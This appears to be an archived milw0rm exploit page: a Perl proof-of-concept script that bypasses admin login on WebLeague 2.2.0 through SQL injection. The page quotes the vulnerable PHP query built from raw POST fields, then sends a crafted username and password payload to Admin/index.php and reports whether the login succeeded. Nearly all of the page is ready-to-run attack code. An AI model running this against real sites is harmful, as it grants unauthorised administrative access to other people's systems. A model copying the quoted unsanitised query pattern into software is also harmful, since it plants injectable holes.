<html><head><title>webLeague 2.2.0 (Auth Bypass) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -W
#
# WebLeague 2.2.0 Remote Admin Bypass p0c
# written by ka0x &lt;ka0x01[at]gmail.com&gt;
#
# need magic_quotes_gpc = Off
#
# Vuln code (Admin/index.php) :
#
# 10:	$sql=&quot;SELECT * FROM $admintable WHERE name = '$_POST[username]' AND password = '$_POST[password]'&quot;; // ---&gt; NOT CLEAN $_POST VARS
# 11:	$result=mysql_query($sql,$db);
# 12:	$number = mysql_num_rows($result);
# 13:	if ($number == &quot;1&quot;) {
#

use LWP::UserAgent ;

my $timeout = 10 ;

die &quot;* USAGE: \tperl $0 &lt;host&gt;\n&quot; unless $ARGV[0] ;

my $host = $ARGV[0] ;

$host = 'http://'.$host if( $host !~ /^http:/ ) ;
$host = $host.'/' unless( substr( $host, -1 ) eq '/' ) ;

my $ua = LWP::UserAgent-&gt;new() or die;
$ua-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1&quot;) ;
$ua-&gt;timeout( $timeout ) ;

my $req = HTTP::Request-&gt;new( POST =&gt; $host.'Admin/index.php' );
$req-&gt;content_type( 'application/x-www-form-urlencoded' ) ;
$req-&gt;content( 'username=\'/*&amp;password=*/ or \'\'=\'' ) ; 	# content $_POST vars: 
								# username=  '/*
								# password=   */ or ''='
my $res = $ua-&gt;request( $req ) ;

if( $res-&gt;content =~ /You are logged in as/i ){
	print &quot;[+] The website is vulnerable.&quot; ;
} 
else {
	print &quot;[-] The website isn't vulnerable.&quot; ;
}


__END__

# milw0rm.com [2009-07-16]</pre></html>